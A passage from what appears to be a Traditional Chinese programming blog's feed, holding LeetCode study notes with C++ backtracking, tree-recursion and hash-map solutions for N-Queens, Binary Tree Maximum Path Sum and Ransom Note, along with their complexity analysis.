$O(2^N \times N)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>遞迴的深度為 $N$，即每個元素在每次遞迴中都被考慮，因此遞迴棧的最大深度是 $O(N)$，result 會存儲 $2^N$ 個子集，每個子集最多包含 $N$ 個元素。因此，結果集佔用的空間是 $O(2^N \times N)$，而用於臨時存放子集的陣列其空間複雜度為 $O(N)$，因此整體空間複雜度會是 $O(2^N \times N)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八皇后問題 | Hard | LeetCode#51. N-Queens</title>
      <link href="/posts/55b0eaae.html"/>
      <url>/posts/55b0eaae.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/51/question1.jpeg"></p><p><img src="/img/LeetCode/51/question2.jpeg"></p><ul><li>題目難度： <code>Hard</code></li><li>題目描述： <strong>N-Queens 其實就是有名的八皇后問題</strong>，將 <code>n</code> 個皇后放到一個大小為 <code>n x n</code> 的棋盤，<strong>使得任何一個皇后都無法直接吃掉其他的皇后</strong>，題目要求輸入 <code>n</code> 求所有可能的棋盤組合，答案的可以是任意順序。每個解答中都需要能夠呈現皇后的擺放位置，題目中以 <code>&#39;Q&#39;</code> 代表皇后，而 <code>&#39;.&#39;</code> 代表空位。</li></ul><blockquote><p>這裡可以看八皇后問題的介紹：<a href="https://zh.wikipedia.org/zh-tw/%E5%85%AB%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98">八皇后問題</a></p></blockquote><div class="note info flat"><p>補充：在西洋棋中，皇后可以走直的、橫的和協的，因此如果皇后的的位置如下，則以它為中心的十字及對角都不能走，都可能會被攻擊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| . | $ | . | $ |</span><br><span class="line">| $ | $ | $ | . |</span><br><span class="line">| $ | Q | $ | $ |</span><br><span class="line">| $ | $ | $ | . |</span><br></pre></td></tr></table></figure></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先這個問題一樣是要窮盡各種可能的走法組合，因此想法一樣會是朝 backtracking 想。首先對於 backtracking 的遞迴終止條件，首先題目給的棋盤會是二維的向量 <code>vector&lt;vector&lt;string&gt;&gt;</code>因此我們在每一層中會去窮盡所有可能的排法，一定會需要一個 subVector 來儲存可能的結果，並且在 subVector 中的長度與 <code>n</code> 一樣後停止，並且將結果加入到回傳向量中。</p><p>而其他每一層做的事情，<strong>就是去判斷棋盤中每個位置是否已經被放皇后，來決定是否可放皇后。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(vector&lt;string&gt; &amp;current, <span class="type">int</span> row, <span class="type">int</span> column)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;row; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current[i][column] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=row<span class="number">-1</span>,j=column<span class="number">-1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>; i--, j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current[i][j] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=row<span class="number">-1</span>,j=column+<span class="number">1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&lt;current.<span class="built_in">size</span>(); i--, j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current[i][j] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nQueensHelper</span><span class="params">(vector&lt;string&gt; &amp;current, <span class="type">int</span> n, <span class="type">int</span> row)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(row == n)&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">0</span>; col&lt; n; col++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(current[row][col] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="built_in">isValid</span>(current, row, col))&#123;</span><br><span class="line">                    current[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">                    <span class="built_in">nQueensHelper</span>(current, n, row+<span class="number">1</span>);</span><br><span class="line">                    current[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">solveNQueens</span>(<span class="type">int</span> n)&#123;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">board</span><span class="params">(n, string(n, <span class="string">&#x27;.&#x27;</span>))</span></span>;</span><br><span class="line">        <span class="built_in">nQueensHelper</span>(board,n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>實際解題一共有三個函數，分別是題目給的 <code>solveNQueens</code> 以及用於 backtracking 主要邏輯的 <code>nQueensHelper</code> 還有用於判斷位置是否有效的  <code>isValid</code>，以下先介紹 <code>solveNQueens</code></p><p><em>solveNQueens</em> 當中首先初始化了棋盤，<strong>棋盤為空，因此都先初始化為 <code>&#39;.&#39;</code></strong> ，接著呼叫 <code>nQueensHelper</code> 在這當中會去將結果加入到回傳向量 <code>result</code> 然後透過本函數來回傳。</p><p>接著是 <code>nQueensHelper</code>，以下是參數說明：</p><ul><li><code>vector&lt;string&gt; &amp;current</code> 會是用於儲存當前排列方式的向量</li><li><code>int n</code> 接著是題目給的 棋盤大小&#x2F;皇后數量</li><li><code>int row</code> 代表棋盤的列</li></ul><p>首先是遞迴的終止條件，也就是當這個棋盤的一種棋盤擺法都擺完后，也就是行數到達 <code>n</code> 就可以將 <code>current</code> 加入到回傳向量中。 接著就是在每一行中要嘗試各種可能，因此會是下面的迴圈來去跑每一個column</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">0</span>; col&lt; n; col++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(current[row][col] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="built_in">isValid</span>(current, row, col))&#123;</span><br><span class="line">        current[row][col] = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">        <span class="built_in">nQueensHelper</span>(current, n, row+<span class="number">1</span>);</span><br><span class="line">        current[row][col] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由於棋盤初始化為 <code>.</code> 代表空位，因此同一個 row 的 每個 col 如果出現空位 (有<code>.</code>) 並且該位置是 valid 的</p><div class="note info flat"><p>該位置valid 代表該位置:</p><ul><li><strong>同一列中沒有其他 <code>Q</code></strong></li><li><strong>同一行中沒有其他 <code>Q</code></strong></li><li><strong>對角線中沒有其他 <code>Q</code></strong></li></ul></div><p>這裡選擇呼叫 <code>isValid</code> 來去進行檢查，<strong>如果為 true 並且有空位那就將該位置的符號替換成 <code>Q</code> 並且進入下一層 <code>nQueensHelper(current, n, row+1);</code></strong> ，如果從下一層中退回這層，那就代表下一層會因為這個位置擺放 <code>Q</code> 而導致無法擺放成功，<strong>這時就需要將本層的這個位置的 <code>Q</code> 替換回 <code>.</code>，並且往下一個 column 嘗試。</strong></p><p>最後， <em>isValid</em> 函數，他會先檢查你穿傳入座標中的同一column 底下是否有其他為 <code>Q</code> 的，如果有直接回傳 <code>false</code> </p><blockquote><p>這裡不需要判斷 <code>current[row][i]</code> 因為你在 <code>nQueensHelper</code> 中會丟下一個 col 值進來</p></blockquote><p>接著判斷對角線，這裡的 for 用法其實我個人很少這樣用，就是同時透過 <code>i</code> 以及 <code>j</code> 變數進行迭代</p><p><img src="/img/LeetCode/51/algo.png"></p><p>這裡分別會去 <strong>檢查同一個 column 有沒有被放過 <code>Q</code>，下一步就是去看對角線有沒有被放過 <code>Q</code></strong> ， 這邊再檢查的時候務必要注意範圍，避免 segmentation fault。 如果檢查都過了那就回傳 <code>true</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(vector&lt;string&gt; &amp;current, <span class="type">int</span> row, <span class="type">int</span> column)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;row; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current[i][column] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=row<span class="number">-1</span>,j=column<span class="number">-1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>; i--, j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current[i][j] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=row<span class="number">-1</span>,j=column+<span class="number">1</span>; i&gt;=<span class="number">0</span> &amp;&amp; j&lt;current.<span class="built_in">size</span>(); i--, j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(current[i][j] == <span class="string">&#x27;Q&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/51/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>這裡需要分成兩部分分析，第一個是皇后擺放方式，第二個是是否 valid：</p><p>皇后擺放方式，每一行中有 $N$ 中選擇，而下一行能選擇的數量會減少，這裡假設每次都減少一個位置可選，這樣選擇數量會是 $N \times N-1 \times … \times 1$ 即為 $O(N! )$</p><p><strong>每當我們放置一個皇后時，還需要檢查這個擺放是否合法（即皇后是否被其他皇后攻擊）</strong>。檢查一個皇后的合法性需要掃描行、列和對角線，這需要 $O(n)$ 的時間，因此整體時間複雜度會是 $O(N! \times N)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>這裡由三個部分組成，第一個是遞迴樹的深度，以及棋盤儲存和回傳向量</p><ul><li>遞迴樹深度為 $N$ 因此所使用空間為 $O(N)$</li><li>棋盤的儲存為 $N \times N$，所使用空間為 $O(N^2)$</li><li>結果儲存，最壞的狀況下解法數量為 $O(N!)$，每個解法需要 $N$ 行來儲存，因此會是 $O(O \times O!)$<br>所以整體空間複雜度會是 $O(N^2 + N!)$</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Hard </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹最大路徑總和 | Hard | LeetCode#124. Binary Tree Maximum Path Sum</title>
      <link href="/posts/bea79d96.html"/>
      <url>/posts/bea79d96.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/124/question1.jpeg"></p><p><img src="/img/LeetCode/124/question2.jpeg"></p><ul><li>題目難度：<code>Hard</code></li><li>題目敘述： 題目給定你一個 Binary Tree 的 <code>root</code>，<strong>求這棵二元樹中的所有路徑中，最大路徑和</strong></li></ul><div class="note info flat"><p>這裡二元樹的路徑的代表的是 <strong>節點序列</strong>，序列由每個由邊連接的相鄰節點組成。一個節點最多只能在序列中出現一次。請注意，該路徑不需要經過Root節點</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><blockquote><p>這是第一次解 Hard，真的花比較久的時間，但也學習到很多</p></blockquote><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我一開始的想法是有問題的，但還是紀錄一下這個錯誤思路，我一開始想得太簡單了，以為就先把所有二元樹的節點DFS 走訪一遍，就能夠得到一個節點順序，接著就是 backtracking 中的子集問題，在序列中找子集元素和最大的組合就是答案。</p><p><img src="/img/LeetCode/124/algo1.png"></p><blockquote><p>但這有一個缺陷，<strong>那就是DFS(inorder)走訪過程的順序不滿足題目敘述的節點序列</strong></p></blockquote><p>像是下面這個例子，經過 inorder 走訪過後的順序會是 <code>-8, 10, 20, -5, -10</code> 那這樣後面就可能以為 <code>10</code> 跟 <code>20</code> 會是相鄰的，且最大的就輸出 <code>30</code>，<strong>但實際情況就是他們之間根本沒有邊相連。</strong></p><p><img src="/img/LeetCode/124/case.jpeg"></p><p>因此這樣的做法會是錯的。</p><blockquote><p>所以做法其實也算是 DFS 但不會是傳統意義上的 backtracking，在每一層中與當前最大的路徑值相加，並且將其與當前最大值比較，返回較大值</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPathSumHelper</span><span class="params">(TreeNode* node, <span class="type">int</span> &amp;globalMax)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> leftMax = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">maxPathSumHelper</span>(node-&gt;left, globalMax));</span><br><span class="line">    <span class="type">int</span> rightMax = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">maxPathSumHelper</span>(node-&gt;right, globalMax));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> currentMax = node-&gt;val + leftMax + rightMax;</span><br><span class="line">    globalMax = <span class="built_in">max</span>(globalMax, currentMax);</span><br><span class="line">    <span class="keyword">return</span> node-&gt;val + <span class="built_in">max</span>(leftMax, rightMax);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> globalMax = INT_MIN; </span><br><span class="line">        <span class="built_in">maxPathSumHelper</span>(root, globalMax);</span><br><span class="line">        <span class="keyword">return</span> globalMax;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡主要定義了兩個函數，一個就是題目給的 <code>maxPathSum</code> 另一個是自己定義的 <code>maxPathSumHelper</code></p><p><em>maxPathSumHelper</em> 參數說明：</p><ul><li><code>TreeNode *node</code>: 用於傳遞節點</li><li><code>int &amp;globalMax</code>: 用於傳遞最大的 Max值 (Pass by reference)</li></ul><p>遞迴的終止條件會是，一旦找到空節點則返回0，代表沒有可用的路徑和 (像是如果只有像是下面一個節點，路徑和就會是 20+0+0)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    20</span><br><span class="line">   / \</span><br><span class="line">NULL  NULL</span><br></pre></td></tr></table></figure><p>接下來是遞迴處理的部分：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> leftMax = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">maxPathSumHelper</span>(node-&gt;left, globalMax));</span><br><span class="line"><span class="type">int</span> rightMax = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">maxPathSumHelper</span>(node-&gt;right, globalMax));</span><br></pre></td></tr></table></figure><p>計算左子樹的最大路徑和。如果左子樹的最大路徑和為負，則取 0 為 max值，因為負數會降低總路徑和，並將回傳結果保存到變數 <code>leftMax</code>。同理也計算右子樹的最大路徑和，若右子樹的最大路徑和為負，則取0 為max值，並將結果保存到變數 <code>rightMax</code>。</p><div class="note info flat"><p>這裡要注意如果要在本地用 <code>max</code> 函數，記得要加上標頭 <code>#include&lt;algorithm&gt;</code> 才能使用</p></div><p>接著就要考慮 <strong>這條路徑從當前節點到左子樹和右子樹的最大路徑和。</strong> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> currentMax = node-&gt;val + leftMax + rightMax;</span><br></pre></td></tr></table></figure><p>接著要去將當前最大路徑和與 global 最大路徑和進行比較，目的是要更新 <code>globalMax</code> 確保 <code>globalMax</code> 始終是遍歷過程中發現的最大路徑和</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globalMax = <span class="built_in">max</span>(currentMax, globalMax);</span><br></pre></td></tr></table></figure><p>接著回傳當前節點的最大路徑和，當前節點到其左子樹或右子樹的最大路徑和。<strong>這是為了讓上層遞歸的節點能夠選擇哪個子節點的路徑來構成更大的路徑和</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> node-&gt;val + <span class="built_in">max</span>(leftMax, rightMax);</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>一開始參數介紹有提到 <code>&amp;globalMax</code> 參數是透過 pass by reference 傳遞的，這裡複習一下</p><ul><li><strong>Pass by value</strong>: 當一個變數以值(Value)傳遞的方式作為函數參數時，<strong>函數會創建一個變數的副本，在函數內部對該變數的修改不會影響到函數外的原始變數。</strong></li><li><strong>Pass by reference</strong>: 當使用引用(Reference)傳遞時，函數接受的是變數的引用(Reference)，<strong>也就是該變數的「別名」。在函數內部對引用參數的修改會直接影響到函數外部的原始變數</strong></li></ul><p>原理很簡單， <strong>&amp;</strong> 就是一個取位址的運算子，因此你是直接修改該位址的變數，而不是像正常函數呼叫一樣，會在 push return address後再根據calling convention 依序將參數push到 call stack 中，你修改的是該變數實際存在的記憶體位址的值。因此，所有的修改都會直接反映在原來的變數上，而不需要在函數結束後再把修改結果回傳</p></div><blockquote><p>所以加上 <code>&amp;</code>，<strong>函數內對 <code>globalMax</code> 的任何修改都會影響到外部的變數，這樣就可以確保在整棵樹的遞歸計算過程中，<code>globalMax</code> 不斷更新為當前的最大路徑和</strong></p></blockquote><p><em>maxPathSum</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> globalMax = INT_MIN; </span><br><span class="line">    <span class="built_in">maxPathSumHelper</span>(root, globalMax);</span><br><span class="line">    <span class="keyword">return</span> globalMax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>傳入參數會是題目給的 <code>root</code> 節點，首先將 <code>globalMax</code> 初始化為常數 <code>INT_MIN</code> 防止溢位風險，接著呼叫  <code>maxPathSumHelper(root, globalMax)</code> 並且最後回傳全局最大的路徑和。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/124/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>由於每個節點會被訪問一次，並且對每個節點進行常數次的運算，因此時間複雜度會是 $O(N)$, $N$ 為二元樹節點數量</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>取決於遞迴的深度，與樹高成正比，因此平衡樹的狀況下會是 $O(Log(N))$，而最壞狀況下會是 $O(N)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p><strong>這一題並沒有進行「回溯」或者「嘗試其他可能的路徑」的過程</strong>，因為二元樹的結構是固定的，對每個節點的路徑計算是確定的。程式是根據當前節點的值、左子樹最大值和右子樹最大值來計算當前路徑和，所以這不是一個典型的 backtracking 問題。 反而會是我可能尚未開始嘗試的 Dynamic Programming(DP) 問題，因為每一題都包含了 <strong>選與不選 (選左子樹，或捨棄；選右子樹，或捨棄) 到問題</strong></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Traversal </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索信 | Easy | LeetCode#383. Ransom Note</title>
      <link href="/posts/cf28187e.html"/>
      <url>/posts/cf28187e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/383/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定兩個字串 <code>ransomNote</code> 以及 <code>magazine</code> ，若 <code>ransomNote</code> 可以由 <code>magazine</code> 中的字母組成，則回傳 <code>ture</code> 否則回傳 <code>false</code></li></ul><div class="note info flat"><p>注意題目給的 Example2，<code>magazine</code>中個別出現字母的數量也是有意義的，如果只有一個 <code>a</code> 也無法組成 <code>ransomNote</code> 中的兩個 <code>a</code></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題的想法就是將 <code>magazine</code> 中的字母丟入 Hash Table 然後，迭代查看 <code>ransomNote</code> 中的字母有無出現在 <code>magazine</code> 有的話就必須將 HashTable　中的對應字母移除或減少數量，而在迴圈中如果發現沒有的話就直接回傳 <code>false</code>，迴圈結束就代表完美匹配，就回傳 <code>true</code></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canConstruct</span><span class="params">(string ransomNote, string magazine)</span></span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; umap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; magazine.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            umap[magazine[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Iterate through the ranSomNote for checking if it can construct by magazines</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> ch: ransomNote)&#123;</span><br><span class="line">            <span class="keyword">if</span>(umap[ch] == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            umap[ch]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先就是透過 <code>unordered_map&lt;char, int&gt; umap</code> 建構 HashTable，如果 <code>magazine</code> 為 <code>aabbccc</code> 則對應的 hash table 會如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: 2,</span><br><span class="line">    &quot;b&quot;: 2,</span><br><span class="line">    &quot;c&quot;: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著就是迭代來去看 <code>ransomNote</code> 中的字元是否匹配 <code>magazine</code>，如果 <code>umap[ch]==0</code> 這就代表沒找到對應的 key，這時就回傳 <code>false</code>。如果有找到 Key 就將對應的出現數量減少1，並繼續檢查。</p><blockquote><p>在 <code>unordered_map</code> 中，如果對應的 Key 不存在，會自動初始化為 0，因此可以直接用 0 來去判斷Key是否存在</p></blockquote><p>一旦迴圈結束後都沒找到 <code>false</code> 則回傳 <code>true</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/383/result.jpeg"></p><h1 